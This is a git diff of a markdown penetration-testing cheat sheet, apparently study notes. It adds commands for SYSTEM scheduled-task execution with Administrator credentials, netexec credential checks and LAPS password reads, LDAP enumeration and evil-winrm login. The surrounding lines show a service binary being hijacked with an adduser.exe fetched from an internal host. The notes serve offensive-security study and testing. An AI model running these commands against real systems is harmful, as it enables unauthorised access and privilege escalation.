@@ -563,10 +563,16 @@ icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
 iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
 move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
-
 # Check if it worked
 net user
 net localgroup administrators
+
+
+# Create scheduled task to be executed as Administrator
+$pw = ConvertTo-SecureString "ADMIN_PASS" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr TO_EXECUTE /ru SYSTEM } -Credential $creds
+Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
 ```
 
 ##### SeImpersonatePrivilege
@@ -923,6 +929,8 @@ sudo nbtscan -r IP/24
 
 ##### enum4linux
 
+https://hackviser.com/tactics/tools/enum4linux
+
 ```sh
 enum4linux -a IP
 ```
@@ -932,6 +940,13 @@ enum4linux -a IP
 ```sh
 # Enumerate shares
 smbmap -H IP
+```
+
+##### netexec
+
+```sh
+# Validate if credentials work
+netexec smb IP -u 'USER' -p 'PASSSWORD'
 ```
 
 ##### smbclient
@@ -1060,6 +1075,42 @@ snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
 ```
 
+#### LDAP (TCP: 389/636)
+
+##### Nmap
+
+```sh
+nmap -n -sV --script "ldap* and not brute" IP
+```
+
+##### ldapsearch
+
+```sh
+ldapsearch -H ldap://IP -x -b "DC=DOMAINPREFIX,DC=DOMAINSUFFIX" 
+```
+
+##### ldapdomaindump
+
+```sh
+ldapdomaindump IP -u 'DOMAIN\USER' -p 'PASSWORD'
+```
+
+##### netexec
+
+``` sh
+# Read LAPS password
+netexec ldap IP -u 'USER' -p 'PASSWORD' -M laps
+# Confirm credential
+netexec ldap IP -u Administrator -p 'PASSWORD'
+```
+
+#### WinRM (TCP: 5985/5986)
+
+```sh
+# Remote login
+evil-winrm -i IP -u 'USER' -p 'PASSWORD' 
+```
+
 #### Databases
 
 ##### MSSQL (TCP: 1433)
@@ -1117,6 +1168,7 @@ select * from DB_NAME;
 ```sh
 # Check current shell
 ps -p $$
+echo %COMSPEC%
 
 # Kali directory webshells
 /usr/share/webshells/
@@ -1233,6 +1285,8 @@ xxd -b malware.txt
 
 # Test whether running in CMD or PS
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+# Escaping for formatting
+`
 
 # Exiftool, display duplicated and unknown tags
 exiftool -a -u document.pdf
